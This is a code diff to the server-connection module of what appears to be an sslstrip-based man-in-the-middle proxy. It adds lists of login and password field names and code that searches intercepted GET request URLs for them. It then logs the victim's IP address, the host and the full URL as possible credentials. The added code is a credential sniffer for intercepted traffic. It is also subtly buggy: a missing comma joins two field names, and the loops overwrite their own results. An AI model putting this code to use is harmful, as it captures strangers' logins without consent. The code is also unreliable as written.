@@ -20,9 +20,9 @@ import logging, re, string, random, zlib, gzip, StringIO
 import plugins
 
 from twisted.web.http import HTTPClient
-from ResponseTampererFactory import ResponseTampererFactory
-from URLMonitorHSTS import URLMonitor
-from ProxyPlugins import ProxyPlugins
+from libs.ssltripkoto.ResponseTampererFactory import ResponseTampererFactory
+from URLMonitor import URLMonitor
+from libs.sergioproxy.ProxyPlugins import ProxyPlugins
 
 class ServerConnection(HTTPClient):
 
@@ -54,6 +54,17 @@ class ServerConnection(HTTPClient):
         self.contentLength    = None
         self.shutdownComplete = False
 
+        #these field names were stolen from the etter.fields file (Ettercap Project)
+        self.http_userfields = ['log','login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
+                                'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
+                                'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
+                                'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
+                                'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in']
+
+        self.http_passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword', 
+                                'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password'
+                                'passwort', 'passwrd', 'wppassword', 'upasswd']
+
     def getLogLevel(self):
         return logging.DEBUG
 
@@ -63,6 +74,18 @@ class ServerConnection(HTTPClient):
     def sendRequest(self):
         if self.command == 'GET':
             logging.info("%s Sending Request: %s"  % (self.client.getClientIP(), self.headers['host']))
+
+            #check for creds passed in GET requests.. It's surprising to see how many people still do this (please stahp)
+            for user in self.http_userfields:
+                username = re.findall("("+ user +")=([^&|;]*)", self.uri, re.IGNORECASE)
+
+            for passw in self.http_passfields:
+                password = re.findall("(" + passw + ")=([^&|;]*)", self.uri, re.IGNORECASE)
+
+            if (username and password):
+                message = "%s %s Possible Credentials (%s):\n%s" % (self.client.getClientIP(), self.command, self.headers['host'], self.uri)
+                logging.warning(message)
+
         self.plugins.hook()
         self.sendCommand(self.command, self.uri)
 
